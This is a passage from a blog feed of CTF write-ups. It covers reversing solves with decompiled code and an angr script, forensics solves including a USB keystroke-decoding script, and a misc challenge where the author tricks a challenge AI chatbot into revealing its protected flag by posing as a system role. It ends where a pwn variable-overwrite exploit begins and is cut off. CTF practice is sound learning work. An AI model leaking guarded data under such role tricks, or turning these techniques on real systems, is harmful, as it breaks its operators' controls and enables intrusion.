class="line">        flag += <span class="built_in">chr</span>((val &amp; <span class="number">0xff</span>) ^ <span class="number">0xc0</span>)</span><br><span class="line">        flag += <span class="built_in">chr</span>(((val &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>) ^ <span class="number">0xb0</span>)</span><br><span class="line">        flag += <span class="built_in">chr</span>(((val &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>) ^ <span class="number">0xc0</span>)</span><br><span class="line">        flag += <span class="built_in">chr</span>(((val &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>) ^ <span class="number">0xb0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    </span><br><span class="line">print_flag() </span><br></pre></td></tr></table></figure><h3 id="theseus"><a href="#theseus" class="headerlink" title="theseus"></a>theseus</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> cVar1;</span><br><span class="line">  <span class="type">int</span> iVar2;</span><br><span class="line">  undefined8 uVar3;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> local_68;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">int</span> local_60;</span><br><span class="line">  <span class="type">char</span> local_48 [<span class="number">56</span>];</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  iVar2 = getpagesize();</span><br><span class="line">  mprotect((<span class="type">void</span> *)((<span class="type">long</span>)-iVar2 &amp; <span class="number">0x4011e9</span>),(<span class="type">long</span>)iVar2,<span class="number">7</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input flag: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00402011);</span><br><span class="line">  local_68 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i = i + <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">3</span> &lt; i) &#123;</span><br><span class="line">      local_68 = (i * <span class="number">0xb</span>) % <span class="number">0xf</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cVar1 = (<span class="type">char</span>)local_68;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">8</span>) &#123;</span><br><span class="line">      compare[i + <span class="number">0x25</span>] = (code)((<span class="type">char</span>)compare[i + <span class="number">0x25</span>] + cVar1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (i &lt; <span class="number">0x10</span>) &#123;</span><br><span class="line">        compare[i + <span class="number">0x27</span>] = (code)((<span class="type">char</span>)compare[i + <span class="number">0x27</span>] + cVar1);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0x18</span>) &#123;</span><br><span class="line">          compare[i + <span class="number">0x31</span>] = (code)((<span class="type">char</span>)compare[i + <span class="number">0x31</span>] + cVar1);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          compare[i + <span class="number">0x39</span>] = (code)((<span class="type">char</span>)compare[i + <span class="number">0x39</span>] + cVar1);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  local_60 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x19</span> &lt; local_60) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">      uVar3 = <span class="number">0</span>;</span><br><span class="line">LAB_00401478:</span><br><span class="line">      <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">        __stack_chk_fail();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> uVar3;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar2 = compare((<span class="type">int</span>)local_48[local_60],local_60);</span><br><span class="line">    <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Incorrect.&quot;</span>);</span><br><span class="line">      uVar3 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LAB_00401478;</span><br><span class="line">    &#125;</span><br><span class="line">    local_60 = local_60 + <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line"></span><br><span class="line">project = angr.Project(<span class="string">&quot;./chall&quot;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@project.hook(<span class="params"><span class="number">0x401467</span></span>)  </span><span class="comment"># Target address</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_flag</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;VALID INPUT:&quot;</span>, state.posix.dumps(<span class="number">0</span>))</span><br><span class="line">    project.terminate_execution()</span><br><span class="line"></span><br><span class="line">project.execute()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="Just-mp4"><a href="#Just-mp4" class="headerlink" title="Just_mp4"></a>Just_mp4</h3><p><img src="/imgs/post4/forensic/just_mp4.gif" alt="just_mp4"></p><h3 id="whats-happening"><a href="#whats-happening" class="headerlink" title="whats_happening"></a>whats_happening</h3><p>file <code>updog</code> is likely an ISO image file. ISO 9660 is a standard file system for optical disc media, such as CD-ROMs and DVD-ROMs, and the “ISO Label” indicates that the ISO file has been created according to ISO standards.</p><p>we can mount this ISO file as follows</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">mkdir</span> ~/iso_mount</span><br><span class="line">$ sudo mount -o loop updog ~/iso_mount</span><br></pre></td></tr></table></figure><p>after mounting </p><p><img src="/imgs/post4/forensic/whats_happening.gif" alt="whats_happening"></p><h3 id="lowkey-messedup"><a href="#lowkey-messedup" class="headerlink" title="lowkey_messedup"></a>lowkey_messedup</h3><p>pcap file given this time opening the file on wireshark we see that its USB based pcap file, now as there are USB-Mouse&#x2F; Keyboard and Storage devices. There would be data related to that to figure out if device connected is the keyboard, we can actually, check for the “interrupt in” info section and data below <strong>Leftover Capture Data</strong>  </p><p><img src="/imgs/post4/forensic/lowkey_messedup.png" alt="lowkey_messedup"></p><p>extracting these data from each packet </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r chall.pcap -T fields -e usb.capdata &gt; data.txt</span><br></pre></td></tr></table></figure><p>and magic (got through this <a href="https://blog.stayontarget.org/2019/03/decoding-mixed-case-usb-keystrokes-from.html">blog</a>)</p><p><img src="/imgs/post4/forensic/lowkey_messedup_flag.png" alt="lowkey_messedup_flag"></p><h4 id="Solve-2"><a href="#Solve-2" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> sys,os</span><br><span class="line"></span><br><span class="line"><span class="comment">#declare -A lcasekey</span></span><br><span class="line">lcasekey = &#123;&#125;</span><br><span class="line"><span class="comment">#declare -A ucasekey</span></span><br><span class="line">ucasekey = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#associate USB HID scan codes with keys</span></span><br><span class="line"><span class="comment">#ex: key 4  can be both &quot;a&quot; and &quot;A&quot;, depending on if SHIFT is held down</span></span><br><span class="line">lcasekey[<span class="number">4</span>]=<span class="string">&quot;a&quot;</span>;           ucasekey[<span class="number">4</span>]=<span class="string">&quot;A&quot;</span></span><br><span class="line">lcasekey[<span class="number">5</span>]=<span class="string">&quot;b&quot;</span>;           ucasekey[<span class="number">5</span>]=<span class="string">&quot;B&quot;</span></span><br><span class="line">lcasekey[<span class="number">6</span>]=<span class="string">&quot;c&quot;</span>;           ucasekey[<span class="number">6</span>]=<span class="string">&quot;C&quot;</span></span><br><span class="line">lcasekey[<span class="number">7</span>]=<span class="string">&quot;d&quot;</span>;           ucasekey[<span class="number">7</span>]=<span class="string">&quot;D&quot;</span></span><br><span class="line">lcasekey[<span class="number">8</span>]=<span class="string">&quot;e&quot;</span>;           ucasekey[<span class="number">8</span>]=<span class="string">&quot;E&quot;</span></span><br><span class="line">lcasekey[<span class="number">9</span>]=<span class="string">&quot;f&quot;</span>;           ucasekey[<span class="number">9</span>]=<span class="string">&quot;F&quot;</span></span><br><span class="line">lcasekey[<span class="number">10</span>]=<span class="string">&quot;g&quot;</span>;          ucasekey[<span class="number">10</span>]=<span class="string">&quot;G&quot;</span></span><br><span class="line">lcasekey[<span class="number">11</span>]=<span class="string">&quot;h&quot;</span>;          ucasekey[<span class="number">11</span>]=<span class="string">&quot;H&quot;</span></span><br><span class="line">lcasekey[<span class="number">12</span>]=<span class="string">&quot;i&quot;</span>;          ucasekey[<span class="number">12</span>]=<span class="string">&quot;I&quot;</span></span><br><span class="line">lcasekey[<span class="number">13</span>]=<span class="string">&quot;j&quot;</span>;          ucasekey[<span class="number">13</span>]=<span class="string">&quot;J&quot;</span></span><br><span class="line">lcasekey[<span class="number">14</span>]=<span class="string">&quot;k&quot;</span>;          ucasekey[<span class="number">14</span>]=<span class="string">&quot;K&quot;</span></span><br><span class="line">lcasekey[<span class="number">15</span>]=<span class="string">&quot;l&quot;</span>;          ucasekey[<span class="number">15</span>]=<span class="string">&quot;L&quot;</span></span><br><span class="line">lcasekey[<span class="number">16</span>]=<span class="string">&quot;m&quot;</span>;          ucasekey[<span class="number">16</span>]=<span class="string">&quot;M&quot;</span></span><br><span class="line">lcasekey[<span class="number">17</span>]=<span class="string">&quot;n&quot;</span>;          ucasekey[<span class="number">17</span>]=<span class="string">&quot;N&quot;</span></span><br><span class="line">lcasekey[<span class="number">18</span>]=<span class="string">&quot;o&quot;</span>;          ucasekey[<span class="number">18</span>]=<span class="string">&quot;O&quot;</span></span><br><span class="line">lcasekey[<span class="number">19</span>]=<span class="string">&quot;p&quot;</span>;          ucasekey[<span class="number">19</span>]=<span class="string">&quot;P&quot;</span></span><br><span class="line">lcasekey[<span class="number">20</span>]=<span class="string">&quot;q&quot;</span>;          ucasekey[<span class="number">20</span>]=<span class="string">&quot;Q&quot;</span></span><br><span class="line">lcasekey[<span class="number">21</span>]=<span class="string">&quot;r&quot;</span>;          ucasekey[<span class="number">21</span>]=<span class="string">&quot;R&quot;</span></span><br><span class="line">lcasekey[<span class="number">22</span>]=<span class="string">&quot;s&quot;</span>;          ucasekey[<span class="number">22</span>]=<span class="string">&quot;S&quot;</span></span><br><span class="line">lcasekey[<span class="number">23</span>]=<span class="string">&quot;t&quot;</span>;          ucasekey[<span class="number">23</span>]=<span class="string">&quot;T&quot;</span></span><br><span class="line">lcasekey[<span class="number">24</span>]=<span class="string">&quot;u&quot;</span>;          ucasekey[<span class="number">24</span>]=<span class="string">&quot;U&quot;</span></span><br><span class="line">lcasekey[<span class="number">25</span>]=<span class="string">&quot;v&quot;</span>;          ucasekey[<span class="number">25</span>]=<span class="string">&quot;V&quot;</span></span><br><span class="line">lcasekey[<span class="number">26</span>]=<span class="string">&quot;w&quot;</span>;          ucasekey[<span class="number">26</span>]=<span class="string">&quot;W&quot;</span></span><br><span class="line">lcasekey[<span class="number">27</span>]=<span class="string">&quot;x&quot;</span>;          ucasekey[<span class="number">27</span>]=<span class="string">&quot;X&quot;</span></span><br><span class="line">lcasekey[<span class="number">28</span>]=<span class="string">&quot;y&quot;</span>;          ucasekey[<span class="number">28</span>]=<span class="string">&quot;Y&quot;</span></span><br><span class="line">lcasekey[<span class="number">29</span>]=<span class="string">&quot;z&quot;</span>;          ucasekey[<span class="number">29</span>]=<span class="string">&quot;Z&quot;</span></span><br><span class="line">lcasekey[<span class="number">30</span>]=<span class="string">&quot;1&quot;</span>;          ucasekey[<span class="number">30</span>]=<span class="string">&quot;!&quot;</span></span><br><span class="line">lcasekey[<span class="number">31</span>]=<span class="string">&quot;2&quot;</span>;          ucasekey[<span class="number">31</span>]=<span class="string">&quot;@&quot;</span></span><br><span class="line">lcasekey[<span class="number">32</span>]=<span class="string">&quot;3&quot;</span>;          ucasekey[<span class="number">32</span>]=<span class="string">&quot;#&quot;</span></span><br><span class="line">lcasekey[<span class="number">33</span>]=<span class="string">&quot;4&quot;</span>;          ucasekey[<span class="number">33</span>]=<span class="string">&quot;$&quot;</span></span><br><span class="line">lcasekey[<span class="number">34</span>]=<span class="string">&quot;5&quot;</span>;          ucasekey[<span class="number">34</span>]=<span class="string">&quot;%&quot;</span></span><br><span class="line">lcasekey[<span class="number">35</span>]=<span class="string">&quot;6&quot;</span>;          ucasekey[<span class="number">35</span>]=<span class="string">&quot;^&quot;</span></span><br><span class="line">lcasekey[<span class="number">36</span>]=<span class="string">&quot;7&quot;</span>;          ucasekey[<span class="number">36</span>]=<span class="string">&quot;&amp;&quot;</span></span><br><span class="line">lcasekey[<span class="number">37</span>]=<span class="string">&quot;8&quot;</span>;          ucasekey[<span class="number">37</span>]=<span class="string">&quot;*&quot;</span></span><br><span class="line">lcasekey[<span class="number">38</span>]=<span class="string">&quot;9&quot;</span>;          ucasekey[<span class="number">38</span>]=<span class="string">&quot;(&quot;</span></span><br><span class="line">lcasekey[<span class="number">39</span>]=<span class="string">&quot;0&quot;</span>;          ucasekey[<span class="number">39</span>]=<span class="string">&quot;)&quot;</span></span><br><span class="line">lcasekey[<span class="number">40</span>]=<span class="string">&quot;Enter&quot;</span>;      ucasekey[<span class="number">40</span>]=<span class="string">&quot;Enter&quot;</span></span><br><span class="line">lcasekey[<span class="number">41</span>]=<span class="string">&quot;esc&quot;</span>;        ucasekey[<span class="number">41</span>]=<span class="string">&quot;esc&quot;</span></span><br><span class="line">lcasekey[<span class="number">42</span>]=<span class="string">&quot;del&quot;</span>;        ucasekey[<span class="number">42</span>]=<span class="string">&quot;del&quot;</span></span><br><span class="line">lcasekey[<span class="number">43</span>]=<span class="string">&quot;tab&quot;</span>;        ucasekey[<span class="number">43</span>]=<span class="string">&quot;tab&quot;</span></span><br><span class="line">lcasekey[<span class="number">44</span>]=<span class="string">&quot;space&quot;</span>;      ucasekey[<span class="number">44</span>]=<span class="string">&quot;space&quot;</span></span><br><span class="line">lcasekey[<span class="number">45</span>]=<span class="string">&quot;-&quot;</span>;          ucasekey[<span class="number">45</span>]=<span class="string">&quot;_&quot;</span></span><br><span class="line">lcasekey[<span class="number">46</span>]=<span class="string">&quot;=&quot;</span>;          ucasekey[<span class="number">46</span>]=<span class="string">&quot;+&quot;</span></span><br><span class="line">lcasekey[<span class="number">47</span>]=<span class="string">&quot;[&quot;</span>;          ucasekey[<span class="number">47</span>]=<span class="string">&quot;&#123;&quot;</span></span><br><span class="line">lcasekey[<span class="number">48</span>]=<span class="string">&quot;]&quot;</span>;          ucasekey[<span class="number">48</span>]=<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">lcasekey[<span class="number">49</span>]=<span class="string">&quot;\\&quot;</span>;         ucasekey[<span class="number">49</span>]=<span class="string">&quot;|&quot;</span></span><br><span class="line">lcasekey[<span class="number">50</span>]=<span class="string">&quot; &quot;</span>;          ucasekey[<span class="number">50</span>]=<span class="string">&quot; &quot;</span></span><br><span class="line">lcasekey[<span class="number">51</span>]=<span class="string">&quot;;&quot;</span>;          ucasekey[<span class="number">51</span>]=<span class="string">&quot;:&quot;</span></span><br><span class="line">lcasekey[<span class="number">52</span>]=<span class="string">&quot;&#x27;&quot;</span>;          ucasekey[<span class="number">52</span>]=<span class="string">&quot;\&quot;&quot;</span></span><br><span class="line">lcasekey[<span class="number">53</span>]=<span class="string">&quot;`&quot;</span>;          ucasekey[<span class="number">53</span>]=<span class="string">&quot;~&quot;</span></span><br><span class="line">lcasekey[<span class="number">54</span>]=<span class="string">&quot;,&quot;</span>;          ucasekey[<span class="number">54</span>]=<span class="string">&quot;&lt;&quot;</span></span><br><span class="line">lcasekey[<span class="number">55</span>]=<span class="string">&quot;.&quot;</span>;          ucasekey[<span class="number">55</span>]=<span class="string">&quot;&gt;&quot;</span></span><br><span class="line">lcasekey[<span class="number">56</span>]=<span class="string">&quot;/&quot;</span>;          ucasekey[<span class="number">56</span>]=<span class="string">&quot;?&quot;</span></span><br><span class="line">lcasekey[<span class="number">57</span>]=<span class="string">&quot;CapsLock&quot;</span>;   ucasekey[<span class="number">57</span>]=<span class="string">&quot;CapsLock&quot;</span></span><br><span class="line">lcasekey[<span class="number">79</span>]=<span class="string">&quot;RightArrow&quot;</span>; ucasekey[<span class="number">79</span>]=<span class="string">&quot;RightArrow&quot;</span></span><br><span class="line">lcasekey[<span class="number">80</span>]=<span class="string">&quot;LeftArrow&quot;</span>;  ucasekey[<span class="number">80</span>]=<span class="string">&quot;LeftArrow&quot;</span></span><br><span class="line">lcasekey[<span class="number">84</span>]=<span class="string">&quot;/&quot;</span>;          ucasekey[<span class="number">84</span>]=<span class="string">&quot;/&quot;</span></span><br><span class="line">lcasekey[<span class="number">85</span>]=<span class="string">&quot;*&quot;</span>;          ucasekey[<span class="number">85</span>]=<span class="string">&quot;*&quot;</span></span><br><span class="line">lcasekey[<span class="number">86</span>]=<span class="string">&quot;-&quot;</span>;          ucasekey[<span class="number">86</span>]=<span class="string">&quot;-&quot;</span></span><br><span class="line">lcasekey[<span class="number">87</span>]=<span class="string">&quot;+&quot;</span>;          ucasekey[<span class="number">87</span>]=<span class="string">&quot;+&quot;</span></span><br><span class="line">lcasekey[<span class="number">88</span>]=<span class="string">&quot;Enter&quot;</span>;      ucasekey[<span class="number">88</span>]=<span class="string">&quot;Enter&quot;</span></span><br><span class="line">lcasekey[<span class="number">89</span>]=<span class="string">&quot;1&quot;</span>;          ucasekey[<span class="number">89</span>]=<span class="string">&quot;1&quot;</span></span><br><span class="line">lcasekey[<span class="number">90</span>]=<span class="string">&quot;2&quot;</span>;          ucasekey[<span class="number">90</span>]=<span class="string">&quot;2&quot;</span></span><br><span class="line">lcasekey[<span class="number">91</span>]=<span class="string">&quot;3&quot;</span>;          ucasekey[<span class="number">91</span>]=<span class="string">&quot;3&quot;</span></span><br><span class="line">lcasekey[<span class="number">92</span>]=<span class="string">&quot;4&quot;</span>;          ucasekey[<span class="number">92</span>]=<span class="string">&quot;4&quot;</span></span><br><span class="line">lcasekey[<span class="number">93</span>]=<span class="string">&quot;5&quot;</span>;          ucasekey[<span class="number">93</span>]=<span class="string">&quot;5&quot;</span></span><br><span class="line">lcasekey[<span class="number">94</span>]=<span class="string">&quot;6&quot;</span>;          ucasekey[<span class="number">94</span>]=<span class="string">&quot;6&quot;</span></span><br><span class="line">lcasekey[<span class="number">95</span>]=<span class="string">&quot;7&quot;</span>;          ucasekey[<span class="number">95</span>]=<span class="string">&quot;7&quot;</span></span><br><span class="line">lcasekey[<span class="number">96</span>]=<span class="string">&quot;8&quot;</span>;          ucasekey[<span class="number">96</span>]=<span class="string">&quot;8&quot;</span></span><br><span class="line">lcasekey[<span class="number">97</span>]=<span class="string">&quot;9&quot;</span>;          ucasekey[<span class="number">97</span>]=<span class="string">&quot;9&quot;</span></span><br><span class="line">lcasekey[<span class="number">98</span>]=<span class="string">&quot;0&quot;</span>;          ucasekey[<span class="number">98</span>]=<span class="string">&quot;0&quot;</span></span><br><span class="line">lcasekey[<span class="number">99</span>]=<span class="string">&quot;.&quot;</span>;          ucasekey[<span class="number">99</span>]=<span class="string">&quot;.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#make sure filename to open has been provided</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:</span><br><span class="line">keycodes = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keycodes:</span><br><span class="line"><span class="comment">#dump line to bytearray</span></span><br><span class="line">bytesArray = <span class="built_in">bytearray</span>.fromhex(line.strip())</span><br><span class="line"><span class="comment">#see if we have a key code</span></span><br><span class="line">val = <span class="built_in">int</span>(bytesArray[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">if</span> val &gt; <span class="number">3</span> <span class="keyword">and</span> val &lt; <span class="number">100</span>:</span><br><span class="line"><span class="comment">#see if left shift or right shift was held down</span></span><br><span class="line"><span class="keyword">if</span> bytesArray[<span class="number">0</span>] == <span class="number">0x02</span> <span class="keyword">or</span> bytesArray[<span class="number">0</span>] == <span class="number">0x20</span> :</span><br><span class="line"><span class="built_in">print</span>(ucasekey[<span class="built_in">int</span>(bytesArray[<span class="number">2</span>])], end=<span class="string">&#x27;&#x27;</span>),  <span class="comment">#single line output</span></span><br><span class="line"><span class="comment">#print(ucasekey[int(bytesArray[2])])            #newline output</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(lcasekey[<span class="built_in">int</span>(bytesArray[<span class="number">2</span>])], end=<span class="string">&#x27;&#x27;</span>),  <span class="comment">#single line output</span></span><br><span class="line"><span class="comment">#print(lcasekey[int(bytesArray[2])])            #newline output</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;USAGE: python %s [filename]&quot;</span> % os.path.basename(__file__))</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Prompt"><a href="#Prompt" class="headerlink" title="Prompt"></a>Prompt</h3><h4 id="Description-6"><a href="#Description-6" class="headerlink" title="Description"></a>Description</h4><p><img src="/imgs/post4/misc/prompt_desc.png" alt="prompt_desc"></p><p>going through <code>main.py</code> file given got this section that seems flag will be visible if role is system and whatnot (just guessed)</p><p><img src="/imgs/post4/misc/prompt.png" alt="prompt"></p><p>i tried this one and got the flag</p><p><img src="/imgs/post4/misc/prompt_flag.png" alt="prompt_flag"></p><p>i dont know the intended way to solve this challenge as second time it didnt work.</p><p>playing with some question containg <strong>flag</strong> word got another hit , as this ai bot can be trick</p><p><img src="/imgs/post4/misc/promt_flag2.png" alt="prompt_flag2"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="EZDORSA-Lv1"><a href="#EZDORSA-Lv1" class="headerlink" title="EZDORSA_Lv1"></a>EZDORSA_Lv1</h3><p><img src="/imgs/post4/crypto/crypto1.png" alt="crypto1.png"></p><p>you know what time it is? its chatGPT time :p</p><p><img src="/imgs/post4/crypto/crypto1.gif" alt="crypto1.png"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="IndexedDB"><a href="#IndexedDB" class="headerlink" title="IndexedDB"></a>IndexedDB</h3><blockquote><p>It appears that the flag has been hidden somewhere on this page. Let’s use the browser’s developer tools to find it.</p></blockquote><p><img src="/imgs/post4/web/web1.gif" alt="web1.gif"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
            <tag> reversing </tag>
            
            <tag> misc </tag>
            
            <tag> forensic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF WriteUp: HTB CA 2023</title>
      <link href="/2023/04/08/post3/ca_2023/"/>
      <url>/2023/04/08/post3/ca_2023/</url>
      
        <content type="html"><![CDATA[<p><img src="/imgs/post3/front2.webp" alt="front.jpg"> </p><p>I participated in a HTB CyberApocalypse CTF 2023 competition this CTF had several category cybersecurity challenges e.g. pwn, cryptography, reverse engineering, Hardware, forensic, crypto , blockchain and ML. It was an intense and exhilarating experience, and I’m excited to share my write-up of the challenges i solved and how i approached them.</p><p>Although i am too late for this write-up as i am good in prolonging things ;) but <strong>Better late than never</strong>, as i am trying  to be good at pwn my first approach is to solve pwn challenges and then <strong>rev</strong> but i tried to solve some other remaining categories challenge as well.</p><p>All challenges can be found <a href="https://github.com/Durge5h/CTFs/tree/main/Competition/HTB-CA-2023">here</a></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="GettingStarted"><a href="#GettingStarted" class="headerlink" title="GettingStarted"></a>GettingStarted</h2><p><img src="/imgs/post3/pwn/getting_started.png" alt="getting_started"></p><p>like name like challenge nothing but just variable overwriting, by sending the random input until we overwrite the <strong>target</strong> variable .</p><p><img src="/imgs/post3/pwn/getting_started.gif" alt="getting_started"> </p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 